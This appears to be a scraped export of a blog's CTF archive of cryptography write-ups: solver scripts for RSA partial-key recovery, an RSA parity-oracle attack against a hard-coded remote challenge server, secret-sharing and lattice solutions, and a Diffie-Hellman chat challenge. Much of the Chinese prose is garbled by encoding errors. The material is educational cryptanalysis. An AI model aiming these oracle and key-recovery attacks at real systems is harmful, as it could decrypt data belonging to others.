FLAG{2^8rsa7589693fc689c77c5f5262d654272427}\nrsa27 partial d and n c # from Crypto.Util.number import * def getFullP(low_p, n): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) p = x*2^512 + low_p root = (p-n).monic().small_roots(X = 2^128, beta = 0.4) if root: return p(root[0]) return None def phase4(low_d, n, c): maybe_p = [] for k in range(1, 4): p = var(\u0026#39;p\u0026#39;) p0 = solve_mod([3*p*low_d == p + k*(n*p - p^2 - n + p)], 2^512) maybe_p += [int(x[0]) for x in p0] print(maybe_p) for x in maybe_p: P = getFullP(x, n) if P: break P = int(P) Q = n // P assert P*Q == n d = inverse_mod(3, (P-1)*(Q-1)) ## print(hex()[2:]) print(long_to_bytes(power_mod(c, d, n))) n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955 phase4(low_d, n, c) ## FLAG{2^8rsa5ab086745f6ec745619a8b65fe4ec560} rsa 28 bit Oracle # e = 0x10001 n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 from pwn import * left=0 right=n num=0 import gmpy2 while right-left\u0026gt;2: num+=1 tmp=gmpy2.powmod(2,num*e,n) senddata=hex((c*tmp)%n)[2:] ## 111.200.241.244:62839 io=remote(\u0026#39;111.200.241.244\u0026#39;,62839) io.recv() io.sendline(senddata) ans=io.recvline().decode()[:-1] print(ans) if ans==\u0026#39;odd\u0026#39;: left=(left+right)//2 if (left+right)%2==0 else (left+right)//2+1 else: right=(left+right)//2 if (left+right)%2==0 else (left+right)//2+1 print(right-left) print(num) io.close() print((left,right)) import gmpy2 while gmpy2.powmod(left,e,n)!=c: left-=1 print(left) from Crypto.Util import number print(number.long_to_bytes(left)) ","date":"14 June 2021","permalink":"/achieve/2019to2021/rsaallinone/","section":"archive","summary":"ä¸€äº›RSAåƒåœ¾é¢˜","title":"RsaAllInOne"},{"content":"\rè“ğŸ±ber 2021åŠå†³èµ› # å¾ˆæ°” , ä¸ºä»€ä¹ˆè¿™å‚»é€¼ç©æ„3ç‚¹ç»“æŸ\nä¸­æ–‡12ç‚¹é’Ÿè¿˜åœ¨ä¸Šæœºåšå®éªŒ ğŸ˜…ğŸ˜…ğŸ˜…\nç¬‘æ­» åƒä¸ªé¥­æ ¹æœ¬æ²¡æœ‰æ—¶é—´å†™è„šæœ¬\nvery smooth # â€‹\tç™½ç»™é¢˜\nè¿ä¸Šåæœ‰ä¸€ä¸ª Hints æ˜¯ä¸€ä¸ªç‰¹æ®Šç´ æ•°çš„é¢˜\nå¯ä»¥å¯¹ä»»æ„æ˜æ–‡ç”¨ Eï¼ŒN åŠ å¯†,ä¸Šä¼ 4,8,16,0x20åˆ©ç”¨é€‰æ‹©æ˜æ–‡çš„æ–¹å¼å¾—åˆ° n\næŠŠnåˆ†è§£æ‰å¾—åˆ°pq\nfrom gmpy2 import gcd from Crypto.Util.number import inverse, long_to_bytes, sieve_base as primes c2 = 0x42a03c9a532106552a1517f833746c75951b9daebc0fd66b616f54622b44f3aec6227a3b4f02f4e77ae98209fa4c52c43596a44468a336d956d69be9588e6544c98313c9e8b4083cc3165102c7704834c66e165971419e17717f98eb0e494c71c498e7c7432a4753329912ec2a60a128e04c93e28c5c253e6ee17c3376f0712fb3b7ae72715f76366eeeb207a5367db8e2f43a5ad33459014bef0d3c225bd11768124a75a54e7c910151cd314ae7bbc4f86fbf6a5f2df7cda7467596bb415d2165ab282c38b2dccd736c3c5f2fea9cf64f417b6340f7d59069f739aa538b6e074fd149a016fc446439a8c2b59d306f748e9abd21a15947f3b31d9cac9c932e9c4d9e639247eaa2345651bf8d741943904c33316b5ebff740f609605ccb0d0069a0e45d230a6af1d12904d998d540387f89529cf8a5c6b491c7bd190ce98120adeab6c6400a735369234655d20dbd1f86213da6bd2ffc07f8c4debc39b33954dc38ac1d897bd58f585f892d35fa9367478f44bc25ac809d3a336aa0a9af3bc7f2661c06cbd414b1a99e1058593a7415135464a10fd0cffa2a5d50bbff9478825075371833996f5f780389b7e466a9545cfbb76fb4cff56addab40c4c043295752a4dbf085cd57e32a44d88c36bd8c71ab55f835a0f54d47db7b1cd9b38dffe4cb2076c7fa38d47ad791e97220c75d795009f933de26d18f19439cb89b1c6eee9b921155 c4 = 0x4e0fc3b860cc8b893eb63d23cfb68ac9750e0519e54949f45e5c230d53443758a7f5187fa111399edad5b82d01546cafc756738c4ba8c80f7f5ccd3f0401ce0d494ee6988fbf9995434a35e70ad5271d18f0790dfb7593022927116a0c2dcdea61e25eeabc67da1b22bc0c2f44be8d35da70af6f78696302d5e78e838668eb22240bc8916c2ed9b90c48ba9bc2d610e9019efba6c8a1f63ed204fbed82954582671b7ca8be91411c0ef4dbc918d913ed80a234ca448b298366fcb6dc241ed3d7744cb3bf5d24811a34875a346bfb37e35f3a77cc5f96aa65863ff7aac97142b2d1eb2b73a72a7918b87d99cfd5f3e7adac18c5016e4e41c96d0110570f7a937b3a21d7e94ea0b407b58d87893903b10e6a3088e3a07426e8d41dd197af71ac855e9a6a6e060556b853e2b40aad8d2581732163ca76c938e687f37c30ac48b3dda19e8814c10f852e71421cae9bdd795e0c7a9afb34261900236c586e59469f0cecd9cdfc81ebeeb0bc6e2f19f6dfb949ee00bd4ed8a1a553dc4a145ae415e39aec7f56ad2c5ef1a33f943b126bc8b67fbb632b01eda6e06ce0f847e32218dcfa5f70687e55e8d7d844308d61311077c5cd4b022c42d6bbf0b436542093bf60cd0ce87b7c9bcb3517ae9d0e51d1a2e05cd40a97b469d127714f3c6dd0183956357db25be4c5443ea01aac72ba583d0cd0a72ad4f6fa30d8ace2bbe87f9ff11ddb293539 c8 = 0x187adec8ba464a1a8f911caaabd95a519fc641729d0bbaebd6733362313d718d783961d4db0772de7e1f53c0971b630007554d3f82ca74a6879a08b1572688306dc5759182f20009c4c8cd645eba15e8e1ecb90c7b332685eaeeea0fc5e0f358880c78fcee3aed48ffc28798c553ad43ffc09adcf8797a0177b98ee692d32fd5564dadee8756192685a325012aa460802197bfb04118e1444708403d75fec3888097c3289de53b2491323d4c0f11b0cd6242192f8a40fef3dae1cbdc0a70a2cbca2c746ccf40aa261e87c9a22f2205375c88098dc20d9d5093d9a1b79e4dcf3ff8029a62b4391e16c7c106b05def5ccf1b22565d0ce2deb3eb1b4943ca28999b86e815566f55d2a7a0c8c341adcfea7d608690c217c9128dc41c708c0b3830159947618a1860d11e5bb376b14e20017972116da12364cc4ba87a0fc33a02f55fab863ac5f841915c6ec6301cc56ca8c4fe7a37031df7cea4bedec32ca4d24832772aff2363d4ba6c943ce67bad23b4a643ac24e20cfaaada364d1b389409b2f9fd52632cd8b80a9264ef9e637947f80521d95a4c173649e05f6fb5c5ad350293e08e2215cfab6a7dbc7901a112f59209dd030219665438b708f7fcd7add7d9b1ebc4fc1f9abb6bcb3bfcaa757dd6d6853990371ec788ca5a5885fc979e0339f6d63fddff99472d09a1ff2a055add58ff8b3b4302ba0cc0f330c107e084c7bae53af298 c16 = 0x96e4bd1a084c122aee1d8547b5eb8cff24a3354ea768dfcc99457a62a7ef2b192bef7b032d046cc95a7171f24273bb84bf82f3640eec73f36a1089c5dd24006c96767f1c3753c686a53e37d9f60708649c9ff46d03117acd5318cd1fe266f26aa8a239c99c7339b5dc3c73c075feacfd7cc70b2324fc3d911a4839ff70f6ad900b57d30115750f6e1604e584f8308ed9f130d5be6e731db98cb3568fea1d941fc1b721888053f632ac39b14a1bdeb273a92ce3b2ade717a25126747ec5dd37397b39e9e7b275d343c52f772eac1a6b1b11b3afd4f39cb061946090c65debeb9c67fc395f07229f7747801252d3190afa627a7b9dd07e01b95d9b18e0cacdb7d6bdd855449139e56ae28b8fe38a37adef071811f14a4670c940bc8ea64a58bac4bb0693989501181fbd0ec225d288c8ea21849f2969b16d585a271d3cf9ad4e15ec720c3e24954ef2228e2d91dcd3c5e3765da779344ddc6798ed7d46ed29969fb8e1218830a2dda369adae57531d29c65a4a6b6d232034b047e2af76ccfd966e510612300b248d376e44da1dc32a359d9d8ecc39d2ad48034dbdd5b5a35270da5e42749b9c15ae67e0c46d325efc1c0afb22df74910bad5388a21fe25c31137c6a62cb68e5ddd6754aa9f5961567f89f20ac240d755dab069acdfe3d16b2e83c13f5b58e6b77e132c957ca5eba6b1f9ac83f8f3d81278e4581c17973b8b2e8a85da96 c32 = 0x35ca1593e142b2847125b555abf2a7671d6453932a90752e4a5e14740b0b2d9150ff2a1e26245ba869916304ac8ff448647f03012a0d0ef3530cfbe381bae2c756a3191100f327c9e1254395a79ae38e180a0f06865976c30ad39e8ea0dd0279ef6e3d2e4585271cd1f60befdb53d7e93e368d17453962b60a81fddd5a0842513fabd3553cd64c9a2c6ab7a590c7dbe62ffbad7a7732b344dddfd599cc76249c9c9cd9fc5535d0e5f843516675a90e19c78cac4150035192c3b672f1a46ff1cfb707dc0c9faa49f43526ae52dfaef2cd7248b2836740782856f1b591e45c165fc5ac198809a6622712a560b605a4ec3d9e6d82a383dd05e5fdbf4b79a6cc2c63a651311876a62304cc184e481548b05ef0a7f29b675355c4217c3f33e8a1904d76a8d89f9461feae3412fc6c16430627ff0709e1b44b754bcd1fb823a74cae92775fdc472755dc50c252685d6c8a9c1358f354e705dd69fbc7fb2bdea38e80cb6d89218918272f4b61daf155d8a7ab06a70be70188669c905ea9ff7b1edf8a1042b9fc8dfc21075e1c24b4300b80e17b8f61cb10a6b9de72dc1bdb45b47e90eb58ae89997f3f53373b8ddad181987b6be6f8945396eb9aec245ca5c13258e2c7d1edfe983d9e613036a010c8c85ac2d369ad9021b3eefd67f88482505625d907f0db8ac3970ea1c5a4cbc8194ac6cd0ba669b5635c3e7cc85eb89db38a86f7b569a7d7 e = 0xb0c9850f9011fff3 tmp1 = c2**2-c4 tmp2 = c2**3 - c8 print(gcd(tmp1,tmp2)) #n n = 10692664679893739061346624963756238326909832986911746671432177977106803747834808482664745066503767659342297985398473672934784214154083982701378892833624959949381593211919420949003713490334711964701876174075490998238639603875932591934027218071278526995196688532809816282613164879439054064395793103540418492601028819750817898231215515490781342362667217521611006486460470021774355363986660297005486140235347671147357347288429551570802373902314351315203691963871248380238591559213114056614371235371632060733799353705032408294405889554859476139483322273931964592871077343201918116296915049134397709997524443709019832884220802486622148127987276341842100859233579597766831078061591735155348141665023151980626921512388513676299779091204193339220987799602731968274328056958108046444484197044587876571576648161905099526406757618769384516494063549805092383328953214018195122332164730563740664245705722818506815008751691569465550951862660691258739370213781878542487435891666566514414160543282396596969430691853935887802828041224909086447462208206244058569311336469455693550763462023232696617101031002302783846517806558340968291885996058813639594795019464746186634849088956261950519343976570981323926159821885608523334734068893605509523992806520200051013 c2 = pow(2,e,n) print(hex(c2)) # ========================================= q = 22960690030954031643742873940756387805063632374349798184486158679056793968326082353744810859681157004386764888216226590055321262725333525018162946329363305619138731630622888165955977549876211714272441886170151684654308569015065787094352398847347785663643177996671368014667130798343655987811559205747080364736341114890032293368422580223606501359822058596759086093511987824715524940155176294187511558172399888678858130086673199405724632211823726260671253464305495983658956071316594110302935414507198453006409876448274797313564489027777441015454737825659566520679223546384865017468537310551644663582219910328842894601218987 p = 465694396182284590994715625131230714161417041725952699878736781345012032174229077433177127599212318839252860698357547341108410217873453860041877707176988034842163129340937209451388376485311961183911455765614162925734677267585939412323019039933618486263931972247343936114712480771059070555737146835361052356166634684179750979833279130369193818863085641945469759413602478617023305793042062127374270238398593152253825771645013808373316824228767738910513983082625750695479978910779636917338424693371960346239509252789852394767480118428666311119275133465046795934573038184768396911187352262509744712465822871605090335322209999 print(n-p*q) c = 0x17bb4730ef3ba7591d5ac5aba56596ea7bb5b3cac908375fed01f827a4ad246457bcf4f67be416126bc421b2ec813aca9ebed52c36734be35fd39fd450bd11831f833053743c7822094bf295d17984380d062764f31c8e8725255eec779d375ec82b76b6d8956107264fd9550d0f7407ad6531bbbc79af22cb85191171e0a79c137f180d9376cce93e9a17fb1d7ba985150f73b8d67be7e47c72bf607aa274369aaaa230078eca1bf4daa0326d46b682b1d94c651946417f7f254c1b6531df833deca73b81d9cf026c5038c8021d31fee10efb4a1f041d9180b7b489a9ce0ea12f82c67529c9088f72e84de35aa48ebfd67e7a8fcaf01b07a937bbeeab578710495abcc80f8a2a57a84d5b76e54cd58d160f6e289bf4848b9b87c7b94164fd11b3dca467074a71e02ed9ea72db34915e1276c48339ef6f4c4a9e971e69041117b6a1f2502a475dfbba83b1c61d1b7e427c0de5132f82b73b0ba839bfe4ad93cb8768596d67aa2dfb873a7589d38a89cae70203e9fdbcd2497adf563480ad03163c96be553ba5f72ad2d57358acd9ebeeb00b2a023f5a9406b5549082a618e43773b903d501bd6aab795362dc49024c2a6a17ba33d13731aea574941766dd1a52c3f3d48f9e26901d4e1c3031ba1cd63c5078bc51d3b0f310236d3d2b9e8a9fa4fa01567293e02ef22dea9d3744924f46e5f16f25ad800f3fa93a5f4c4b58c68bbac1 e = 0xb0c9850f9011fff3 phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # flag{984af69b-5497-471b-9fa3-cda517490ad2} sharing_system # ç®€å•æ•°å­¦é¢˜ï¼Œåšä¸å‡ºæ¥çš„å»ºè®®é‡è¯»åˆä¸€ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…\nç”¨ keys1 ç»™çš„ y äº’ç›¸ç›¸å‡å¾—åˆ°æ²¡æœ‰secretçš„æ–¹ç¨‹\næ„é€ çŸ©é˜µå¾—åˆ°ts\nexp: # from itertools import product from pwn import * from icecream import * from hashlib import sha256 r = remote(\u0026#39;0.0.0.0\u0026#39;,20001) from time import * def gopow(): # print(r.recv(1024)) r.recvuntil(\u0026#39;sha256(XXXX+\u0026#39;) s1 = r.recvuntil(\u0026#39;) == \u0026#39;)[:-5] hashstr = r.recvline()[:-1] print(r.recvuntil(\u0026#39;Give me XXXX \u0026gt;\u0026#39;)) print(s1,hashstr) tab = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; for i in product(tab,repeat=4): tmp = \u0026#39;\u0026#39;.join(i) s0 = bytes(tmp,encoding=\u0026#39;utf-8\u0026#39;) s = s0+s1 hash_value = sha256(s).hexdigest() hash_value = bytes(hash_value,encoding=\u0026#39;utf-8\u0026#39;) if hash_value == hashstr: print(hash_value) ic(\u0026#34;XXXX=\u0026#34;,s0) ic(hash_value,hashstr) print(r.recv(2048)) r.sendline(s0) break gopow() buf = r.recv(1024) print(buf) buf = r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;) print(buf) r.sendline(\u0026#39;1\u0026#39;) buf = r.recvline() # p print(buf) p = int(buf[3:-1]) print(p) buf = r.recvuntil(\u0026#39;key = (\u0026#39;) # key1 x1 = r.recvuntil(\u0026#39;, \u0026#39;) y1 = r.recvuntil(\u0026#39;)\\n\u0026#39;) print(buf,x1,y1) buf = r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;) print(buf) r.sendline(\u0026#39;2\u0026#39;) buf = r.recvline() # p # print(buf) p = int(buf[3:-1]) # print(p) buf = r.recvuntil(\u0026#39;key = (\u0026#39;) # key1 x2 = r.recvuntil(\u0026#39;, \u0026#39;) y2 = r.recvuntil(\u0026#39;)\\n\u0026#39;) print(buf,x1,y1) x1 = int(x1[:-2].decode()) y1 = int(y1[:-2].decode()) x2 = int(x2[:-2].decode()) y2 = int(y2[:-2].decode()) ic(x1) ic(x2) ic(y1) ic(y2) ic(p) keys1 = [[x1,y1]] keys2 = [[x2,y2]] def getXY(): for i in range(1,50): # print(r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;).decode()) r.sendline(\u0026#39;3\u0026#39;) r.recvuntil(\u0026#39;umber (1-49) \u0026gt; \u0026#39;) r.sendline(str(i)) r.recvuntil(\u0026#39;key = (\u0026#39;) x = int(r.recvuntil(\u0026#39;, \u0026#39;)[:-2]) y = int(r.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2]) # print(x,y) keys1.append([x,y]) def getts(key): keys_1 = key XS=[] for i in range(49): xi = keys_1[i][0] xi_1 = keys_1[i+1][0] xs=[] for j in range(49): x1 = pow(xi,j+1,p) x2 = pow(xi_1,j+1,p) tmp = (x1-x2)%p xs.append(tmp) XS.append(xs) YS =[] for i in range(49): yi = keys_1[i][1] yi_1 = keys_1[i+1][1] YS.append([(yi-yi_1)%p]) # print(YS) X = Matrix(Zmod(p),XS) Y = Matrix(Zmod(p),YS) invx = X.inverse() T = invx*Y # print(ts) TS = [i[0] for i in T] return TS getXY() print(keys1) print(len(keys1)) # t = 58510083877094693891040277851267905853617844771064576929521712771940231668984770883328421254238895212042598002659174059244201616561130950785238401399837559644941651285130352373844849078590789578028528768860166902952495931639692465443534927973027133719331474369633030490640443060779278904144461746302422307614 # ts = [ t for _ in range(50 - 1)] ts = getts(keys1) tmp1=0 for i in range(0,49): XS = pow(x1,i+1,p)*ts[i] tmp1 = (tmp1 + XS)%p k1 = (y1 - tmp1)%p tmp2=0 for i in range(0,49): XS = pow(x2,i+1,p)*ts[i] tmp2 = (tmp2 + XS)%p k2 = (y2 - tmp2)%p ic(k1,k2) # print(r.recv(1024)) print(r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;)) r.sendline(\u0026#39;5\u0026#39;) print(r.recvuntil(\u0026#39;Please enter secret 1 \u0026gt; \u0026#39;)) r.sendline(str(k1)) print(r.recvuntil(\u0026#39;Please enter secret 2 \u0026gt; \u0026#39;)) r.sendline(str(k2)) sleep(1) print(r.recv(1024)) er option \u0026gt; \u0026#39; b\u0026#39;Please enter secret 1 \u0026gt; \u0026#39; b\u0026#39;Please enter secret 2 \u0026gt; \u0026#39; b\u0026#39;Wow! How smart you are! Here is your flag: \\nfl{f*ck you!!!}\\nBye!\\n\\n\u0026#39; [*] Closed connection to 0.0.0.0 port 20001 ","date":"5 June 2021","permalink":"/achieve/ctf/bluehat2021/","section":"archive","summary":"","title":"Writeup for crypto in è“ğŸ˜¼2021"},{"content":"å­¦åˆ°hinå¤š\nå­¦å¦¹æ”¹äº†ä¸€ä¸ªèƒ½ç”¨çš„ä»£ç ï¼Œå¯æƒœç»†èŠ‚éƒ¨åˆ†æ²¡å¤„ç†å¥½\né¦–å…ˆç”¨\nhttps://ami.uni-eszterhazy.hu/uploads/papers/finalpdf/AMI_43_from29to41.pdf\nç»™å‡ºçš„æ›²çº¿å˜æ¢æ¥åšæ›²çº¿çš„æ˜ å°„,å†ç”¨åé¢æåˆ°çš„æ€è·¯åœ¨eccæ›²çº¿ä¸Šæ‰¾ç‚¹å†æ˜ å°„å›åŸæ¥çš„æ›²çº¿éªŒè¯æ­£è´Ÿæ€§\næ–‡ç« ä¸­æåˆ°äº†èŒƒå›´çš„è¯æ˜,è¿™é‡Œä¸åšæ·±å…¥\nä¸œæ‹¼è¥¿å‡‘å·äº†ä¸ªé€šè§£ä»£ç æ¥æŠŠç©xï¼š\n# sage n = 6 a = (4*n ^ 2+12*n-3) b = 32*(n+3) ee = EllipticCurve([0, a, 0, b, 0]) # y2=x3+109x2+224x def orig(P, N): x = P[0] y = P[1] a = (8*(N+3)-x+y)/(2*(N+3)*(4-x)) b = (8*(N+3)-x-y)/(2*(N+3)*(4-x)) c = (-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da = denominator(a) db = denominator(b) dc = denominator(c) l = lcm(da, lcm(db, dc)) return [a*l, b*l, c*l] g = ee.gens() print(g) # [(-200 : 680 : 1)] P = ee(-200, 680) # P = ee(g) print(P) # åªè¾“å‡ºä¸€ç»„è§£ for i in range(1,100): x,y,z = orig(i*P, n) if(x\u0026gt;0 and y\u0026gt;0 and z\u0026gt;0): print(f\u0026#39;x={x}\\n, y={y}\\n, z={z}\\n\u0026#39;) print(f\u0026#39;i = {i}\u0026#39;) break ","date":"8 April 2021","permalink":"/achieve/ctf/%E8%99%8E%E7%AC%A62021/","section":"archive","summary":"","title":"è™ç¬¦2021"},{"content":" å’•å’•å’•äº†å¤ªä¹…äº†,ä¸Šä¸ªæœ‰å°±è¯¥åšçš„\nd^3ctf2021 # babyLattice done LLLåˆ†è§£nçš„åº”ç”¨ simpleGroup done babyLattice LLLåˆ†è§£n + ä¸­å›½å‰©ä½™å®šç†ç‰¹æ®Šåº”ç”¨ + næ¬¡å‰©ä½™åˆ¤æ–­ AliceWantFlag todo EasyCurve todo simpleGroup # å¾—çŸ©é˜µ A åˆ†è§£ n\nn = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 M = Matrix(ZZ, [ [1, 0, b ^ 2], [0, 1, b], [0, 0, n] ]) M = M.LLL() # tmp1 = abs(M[0][0]) tmp2 = abs(M[0][2]) print(factor(tmp1)) print(factor(tmp2)) a12 = 1018979931854255696816714991181 a22 = 1151291153120610849180830073509 a11 = 1017199123798810531137951821909 a21 = 207806651167586080788016046729 crt\nfrom icecream import * from Crypto.Util.number import * p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 e = 1928983487 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428] # 36493 * 52859 e1 = 36493 e2 = 52859 ic(len(C)) \u0026#39;\u0026#39;\u0026#39; p-1 e2äº’è´¨ q-1 e1äº’è´¨ \u0026#39;\u0026#39;\u0026#39; def check(d, p, n): if((p - 1) % n == 0): return pow(d, (p - 1) // n, p) == 1 else: k = gcd(n, p - 1) return pow(d, (p - 1) // k, p) == 1 def getM(c, e, p): for i in range(2, e): inv = int(pow(y, i, p)) tmpc = (c * inverse(inv, p)) % p if check(tmpc, p, e): return i exit(0) def func(c): cq = c % q cp = c % p m1 = getM(cp, e1, p) m2 = getM(cq, e2, q) ic(m1,m2) ans = crt([m1,m2],[e1,e2]) ic(hex(ans)) return ans ans=[] for c in C: ans.append(func(c)) tot =0 ans=ans[::-1] for i in ans: tot*=e tot+=i print(tot) print(long_to_bytes(tot)) ","date":"21 March 2021","permalink":"/achieve/ctf/d3ctf2021/","section":"archive","summary":"","title":"d3ctf2021"},{"content":"\rHGAME 2021ç½‘ç»œæ”»é˜²å¤§èµ›crypto wp # EncryptedChats # Description\nSwitch çš„ç—…å‹ Million æ¥ç›‘ç‹±æ¢ç›‘\u0026hellip;\nChallenge Address\nSwitch: ä½ å¥½è€ä¼™æ± Million: ä½ å¥½ Switch: æ‰€ä»¥ä¸ºä»€ä¹ˆè¿™å®¶ä¼™åœ¨è¿™é‡Œ Liki: å› ä¸ºæˆ‘æ˜¯æ¥è®°å½•ä½ ä»¬è°ˆè¯å†…å®¹çš„ Million: å¥½å§ Million: ä¸è¿‡æˆ‘å¯ä»¥æä¸€ä¸ªè¦æ±‚å— Liki: ? Million: æˆ‘ä»¬...æ¢ä¸€ä¸ªç¾¤èŠ Switch: å¥½å•Š! æˆ‘çœ‹çœ‹, å°±æ¢åˆ°åŠ æ³•ç¾¤èŠå§! Switch: å–‚, å¸®å¿™é€‰ä¸€ä¸ªè´¨æ•° g å§ Liki: ??, 12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697 Million: è¿™ä½å¥³å£«ï¼Œå¯ä»¥åŠ³çƒ¦æ‚¨å†ä¸ºæˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªè´¨æ•° p å— Liki: ???...é‚£å°±, 30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119 å§, å¤Ÿå¤§äº†å—? Million: å¥½çš„, æˆ‘é€‰å¥½æˆ‘çš„ a äº†, é‚£ä¹ˆ A = 6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635 # A = g ^ a % p = pow(g, a, p) Switch: okay, b ä¹Ÿé€‰å¥½äº†, B = 5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723 # B = g ^ b % p = pow(g, b, p) Liki: ???? Million: {\u0026#39;iv\u0026#39;: \u0026#39;d3811beb5cd2a4e1e778207ab541082b\u0026#39;, \u0026#39;encrypted_flag\u0026#39;: \u0026#39;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092\u0026#39;} Switch: 